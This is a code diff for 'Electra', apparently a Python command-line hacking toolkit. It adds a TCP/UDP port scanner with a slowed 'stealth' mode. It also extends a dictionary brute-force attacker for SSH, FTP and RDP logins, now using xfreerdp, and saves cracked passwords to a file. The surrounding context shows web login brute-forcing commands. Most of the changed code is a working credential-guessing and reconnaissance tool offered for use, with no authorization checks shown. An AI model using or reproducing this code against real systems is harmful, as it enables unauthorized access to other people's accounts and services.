@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, rdp
+import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time
 
 BANNER = """
 ███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
@@ -7,7 +7,7 @@ BANNER = """
 █████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
 ██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
 ███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
-═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.0
+═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.1
 
 Electra - The master plan plotter.
 """
@@ -19,8 +19,9 @@ class BannerGroup(click.Group):
     
     def format_commands(self, ctx, formatter):
         commands = [
-            ("sscan", "Perform a system scan."),
             ("cdir", "Create a new directory in a specified path."),
+            ("sscan", "Perform a system scan."),
+            ("nscan", "Perform a network scan."),
             ("webpass", "Web Dictionary Password Brute Force Attack."),
             ("webuser", "Web Dictionary Username Brute Force Attack."),
             ("hashgen", "Generate hash of a specific password."),
@@ -36,6 +37,34 @@ class BannerGroup(click.Group):
 @click.option("-h", "--help", is_flag=True, expose_value=False, is_eager=True, callback=lambda ctx, param, value: click.echo(ctx.get_help()) if value else None, help="Show this help message and exit.")
 def cli():
     click.echo(BANNER)
+
+#CDIR COMMAND
+@cli.command()
+@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
+@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
+def cdir(name, path):
+    #Check whether OS is Linux
+    if os.name != "posix":
+        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
+        return
+    
+    #Set default path
+    if not path:
+        path = os.getcwd()
+        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
+    
+    #Construct the full directory path
+    full_path = os.path.join(path, name)
+
+    try:
+        os.makedirs(full_path, exist_ok=True)
+        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
+    except PermissionError:
+        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
+    except FileExistsError:
+        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
 
 #SSCAN COMMAND
 @cli.command()
@@ -100,33 +129,45 @@ def sscan(hostname):
     except Exception as e:
         click.echo(click.style(f"[!] Error: {e}", fg="red"))
 
-#CDIR COMMAND
+#NSCAN COMMAND
 @cli.command()
-@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
-@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
-def cdir(name, path):
-    #Check whether OS is Linux
-    if os.name != "posix":
-        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
-        return
-    
-    #Set default path
-    if not path:
-        path = os.getcwd()
-        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
-    
-    #Construct the full directory path
-    full_path = os.path.join(path, name)
-
-    try:
-        os.makedirs(full_path, exist_ok=True)
-        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
-    except PermissionError:
-        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
-    except FileExistsError:
-        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
-    except Exception as e:
-        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+@click.option("-h", "--host", required=True, help="Target IP, Socket or hostname for network scan.")
+@click.option("-p", "--port", default="1-1024", help="Port (range) to scan. Default 1-1024.")
+@click.option("-t", "--tcp", is_flag=True, help="Perform TCP scan.")
+@click.option("-u", "--udp", is_flag=True, help="Perform UDP scan.")
+@click.option("-s", "--stealth", is_flag=True, help="Perform a stealth scan. Requires root privileges.")
+@click.option("-l", "--loud", is_flag=True, help="Perform a loud scan. (No delays between scans)")
+def nscan(host, port, tcp, udp, stealth, loud):
+    first_port, last_port = map(int, port.split("-"))
+    scan_type = "Stealth" if stealth else "Loud"
+    click.echo(click.style(f"[*] Starting {scan_type} network scan on {host} ...", fg="blue"))
+    for port in range(first_port, last_port + 1):
+        if tcp:
+            try:
+                socketer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                socketer.settimeout(3)
+                result = socketer.connect_ex((host, port))
+                if result == 0:
+                    click.echo(click.style(f"[!] Open TCP port: {port}", fg="green"))
+                socketer.close()
+            except Exception as e:
+                click.echo(click.style(f"[!] TCP scan error on port {port}. {e}", fg="red"))
+        if udp:
+            try:
+                socketer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                socketer.settimeout(3)
+                socketer.sendto(b'', (host, port))
+                socketer.recvfrom(1024)
+                click.echo(click.style(f"[!] Open UDP port: {port}", fg="green"))
+            except socket.timeout:
+                click.echo(click.style(f"[!] Timeout! Port: {port} may be filtered.", fg="yellow"))
+            except Exception as e:
+                click.echo(click.style(f"[!] UDP scan error on port {port}. {e}", fg="red"))
+            finally:
+                socketer.close()
+        if not loud:
+            time.sleep(0.2) #Delay to reduce loudness
+    click.echo(click.style(f"[*] Network scan on {host} completed.", fg="blue"))
 
 #WEBPASS COMMAND
 @cli.command()
@@ -186,7 +227,7 @@ def webuser(url, password, wordlist):
 
 #HASHGEN COMMAND
 @cli.command()
-@click.option("-f", "--function", type=click.Choice(["md5 ", " sha1 ", " sha224 ", " sha256 ", " sha384 ", " sha512 ", " sha3_224 ", " sha3_256 ", " sha3_384 ", " sha3_512 " " bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
+@click.option("-f", "--function", type=click.Choice(["md5", "sha1", "sha224", "sha256", "sha384", "sha512", "sha3_224", "sha3_256", "sha3_384", "sha3_512" "bcrypt"], case_sensitive=False), required=True, help="Hash function (MD5, SHA1, BCrypt, etc).")
 @click.option("-p", "--password", required=True, help="Password to hash.")
 def hashgen(function, password):
     #Generate hash based on selected func
@@ -223,7 +264,7 @@ def hashgen(function, password):
 
 #SERVATK COMMAND
 @cli.command()
-@click.option("-s", "--service", type=click.Choice(["ssh ", " ftp ", " rdp"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
+@click.option("-s", "--service", type=click.Choice(["ssh", "ftp", "rdp"], case_sensitive=False), required=True, help="Specify the service to attack (SSH, FTP, etc).")
 @click.option("-h", "--host", required=True, help="IP, Socket or Hostname of the target.")
 @click.option("-u", "--username", required=True, help="Username for authentication.")
 @click.option("-w", "--wordlist", type=click.Path(exists=True), required=True, help="Path to password wordlist.")
@@ -238,8 +279,12 @@ def srvatk(service, host, username, wordlist):
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     try:
                         client.connect(host, username=username, password=password, timeout=5)
-                        click.echo(click.style(f"[!] Found SSH password for user: {username} is {password}", fg="green"))
+                        click.echo(click.style(f"[!] Found SSH password of user: {username} is {password}", fg="green"))
                         client.close()
+                        #Save ssh password to a file
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                         return
                     except paramiko.AuthenticationException:
                         click.echo(click.style(f"[!] SSH authentication attempt with '{password}' failed.", fg="red"))
@@ -249,8 +294,12 @@ def srvatk(service, host, username, wordlist):
                     try:
                         ftp = ftplib.FTP(host)
                         ftp.login(user=username, passwd=password)
-                        click.echo(click.style(f"[!] Found FTP password for user: {username} is {password}", fg="green"))
+                        click.echo(click.style(f"[!] Found FTP password of user: {username} is {password}", fg="green"))
                         ftp.quit()
+                        #Save ftp password to a file
+                        with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                            service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                            click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                         return
                     except ftplib.error_perm:
                         click.echo(click.style(f"[!] FTP authentication attempt with '{password}' failed.", fg="red"))
@@ -258,12 +307,20 @@ def srvatk(service, host, username, wordlist):
                         click.echo(click.style(f"[!] FTP connection error: {e}", fg="red"))
                 elif service == "rdp":
                     try:
-                        rdp = rdp(host=host, username=username, password=password)
-                        if rdp.authenticate():
-                            click.echo(click.style(f"[!] Found RDP password for user: {username} is {password}", fg="green"))
+                        connection = subprocess.run(
+                            ["xfreerdp", f"/v:{host}", f"/u:{username}", f"/p:{password}", "/cert-ignore", "/auth-only"], capture_output=True, text=True
+                        )
+                        #if "Authentication only, exit status 0" in connection.stderr:
+
+                        if connection.returncode == 0:
+                            click.echo(click.style(f"[!] Found RDP password of user: {username} is {password}", fg="green"))
+                            #Save rdp password to a file
+                            with open("Electra-Found-Service-Passwords.txt", "a") as service_passwords:
+                                service_passwords.write(f"Service: {service.upper()}, Username: {username}, Password: {password}\n")
+                                click.echo(click.style("[!] Found password successfully saved to Electra-Found-Service-Passwords.txt", fg="green"))
                             return
                         else:
-                            click.echo(click.style(f"[!] RDP authentication attemp with '{password}' failed.", fg="red"))
+                            click.echo(click.style(f"[!] RDP authentication attempt with '{password}' failed.", fg="red"))
                     except Exception as e:
                         click.echo(click.style(f"[!] RDP connection error: {e}", fg="red"))
         click.echo(click.style(f"[!] {service.upper()} BF attack completed. No valid passwords found.", fg="magenta"))
